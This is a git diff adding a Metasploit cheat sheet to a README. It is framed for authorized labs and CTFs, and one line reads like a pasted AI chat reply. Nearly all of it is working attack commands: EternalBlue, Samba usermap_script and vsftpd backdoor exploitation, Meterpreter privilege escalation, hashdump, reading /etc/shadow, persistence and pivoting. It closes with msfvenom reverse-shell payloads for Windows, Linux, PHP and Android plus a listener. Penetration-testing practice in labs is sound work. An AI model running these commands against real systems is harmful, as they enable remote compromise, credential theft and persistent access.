@@ -1,5 +1,270 @@
 # Metasploit-Framework-
 Here are some examples of common tasks you can perform with **Metasploit Framework (`msfconsole`)** in Kali Linux:
+Below is a **compact but professional Metasploit guide**, written for **authorized labs, CTFs, and defensive validation only** (HTB / TryHackMe / Metasploitable2).
+I’ll keep it **practical**, but not reckless.
+
+---
+
+# 🔥 Metasploit Cheat Sheet
+
+## 🚀 Start & Database
+
+```bash
+msfconsole
+msfdb init
+workspace
+workspace -a test
+```
+
+---
+
+## 🔍 Search & Use Modules
+
+```bash
+search type:exploit smb
+search cve:2017
+use exploit/windows/smb/ms17_010_eternalblue
+info
+```
+
+---
+
+## ⚙️ Module Options
+
+```bash
+show options
+set RHOSTS 192.168.1.10
+set LHOST 192.168.1.5
+set LPORT 4444
+run
+```
+
+---
+
+## 📦 Payloads
+
+```bash
+show payloads
+set payload windows/meterpreter/reverse_tcp
+```
+
+---
+
+## 🧭 Sessions
+
+```bash
+sessions
+sessions -i 1
+background
+```
+
+---
+
+## 🧰 Meterpreter Basics
+
+```bash
+sysinfo
+getuid
+pwd
+ls
+cd
+download file.txt
+upload shell.exe
+```
+
+---
+
+## 🛑 Exit
+
+```bash
+exit
+```
+
+---
+
+# 🌍 Real-World Exploitation Examples (LAB SAFE)
+
+### ✅ Example 1: SMB Exploit (Metasploitable2)
+
+**Scenario:** Old Samba service (CVE-2007-2447)
+
+```bash
+search samba
+use exploit/multi/samba/usermap_script
+set RHOSTS 192.168.56.101
+run
+```
+
+Result:
+
+```bash
+Command shell session opened
+```
+
+✔ Validates **unauthenticated RCE**
+
+---
+
+### ✅ Example 2: FTP Backdoor
+
+```bash
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.56.101
+run
+```
+
+✔ Demonstrates **service misconfiguration**
+
+---
+
+### ✅ Example 3: Web App Exploit (DVWA)
+
+```bash
+use exploit/unix/webapp/php_include
+set RHOSTS 192.168.56.102
+set TARGETURI /dvwa/vulnerabilities/fi/
+run
+```
+
+✔ Confirms **file inclusion impact**
+
+---
+
+# 🧠 Post-Exploitation Techniques
+
+> Used **only after authorized access**
+
+---
+
+## 👤 Privilege Escalation
+
+```bash
+getuid
+getsystem
+```
+
+Linux:
+
+```bash
+use post/multi/recon/local_exploit_suggester
+run
+```
+
+---
+
+## 🔐 Credential Dumping
+
+```bash
+hashdump
+```
+
+Linux:
+
+```bash
+cat /etc/passwd
+cat /etc/shadow
+```
+
+---
+
+## 🕵️ System Enumeration
+
+```bash
+sysinfo
+ipconfig
+netstat
+ps
+```
+
+---
+
+## 📡 Persistence (LAB ONLY)
+
+```bash
+use post/windows/manage/persistence
+set STARTUP USER
+run
+```
+
+---
+
+## 🔄 Pivoting
+
+```bash
+run autoroute -s 10.10.10.0/24
+use auxiliary/scanner/portscan/tcp
+```
+
+---
+
+## 📁 Data Exfil (Simulation)
+
+```bash
+download secrets.txt
+```
+
+---
+
+# 🛠 Custom Payload Creation (msfvenom)
+
+⚠️ Use only for **payload testing & detection validation**
+
+---
+
+## 🪟 Windows Reverse Shell
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp \
+LHOST=192.168.1.5 LPORT=4444 \
+-f exe > shell.exe
+```
+
+---
+
+## 🐧 Linux ELF Payload
+
+```bash
+msfvenom -p linux/x64/meterpreter/reverse_tcp \
+LHOST=192.168.1.5 LPORT=4444 \
+-f elf > shell.elf
+```
+
+---
+
+## 🌐 PHP Web Shell
+
+```bash
+msfvenom -p php/meterpreter/reverse_tcp \
+LHOST=192.168.1.5 LPORT=4444 \
+-f raw > shell.php
+```
+
+---
+
+## 📱 Android Payload
+
+```bash
+msfvenom -p android/meterpreter/reverse_tcp \
+LHOST=192.168.1.5 LPORT=4444 \
+-o app.apk
+```
+
+---
+
+## 🎧 Listener
+
+```bash
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.5
+set LPORT 4444
+run
+```
+
+---
+
+
 
 ---
 
